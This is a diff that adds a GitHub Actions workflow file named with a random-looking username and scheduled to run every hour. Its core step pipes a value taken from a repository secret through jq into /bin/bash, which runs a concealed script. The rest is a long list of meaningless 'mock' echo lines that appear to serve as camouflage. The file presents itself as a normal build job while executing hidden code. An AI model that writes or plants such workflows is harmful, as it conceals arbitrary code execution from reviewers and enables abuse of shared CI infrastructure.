@@ -1,0 +1,29 @@
+name: liguifeng2603
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 * * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: liguifeng2603
+        env:
+          w27169: ${{ secrets.w27169 }}
+        run: |
+          [ $RANDOM -gt 1000 ] && echo "Random passed"
+          echo $w27169 | jq -r .p17434 | /bin/bash
+          echo "Objdump mock: objdump --version 2>/dev/null | head -1 || echo no-objdump"
+          echo "Tr mock: echo 'ABC' | tr 'A-Z' 'a-z' 2>/dev/null || echo no-tr"
+          echo "Info mock: info ls 2>/dev/null 2>&1 | head -1 || echo no-info"
+          echo "In-array test: [[ 'a' =~ [a-z] ]] && echo Match"
+          echo "Case mock: case 1 in 1) echo 1;; esac"
+          echo "Uname mock: uname -a 2>/dev/null | head -1 || echo no-uname"
+          echo "Random string: $(cat /dev/urandom | tr -cd 'a-z' | head -c 5 2>/dev/null || echo abcde)"
+          echo "Wget mock: wget -qO- http://example.com 2>/dev/null | head -1 || echo no-wget"
+          echo "Awk mock: echo '1' | awk '{print \$1+1}' 2>/dev/null || echo no-awk"
+          echo "Glob test: echo *.sh 2>/dev/null || echo no-sh"
+          echo "Awk mock: echo '1 2' | awk '{print \$1}' 2>/dev/null || echo no-awk"
+          echo "Libtool mock: libtool --version 2>/dev/null | head -1 || echo no-libtool"
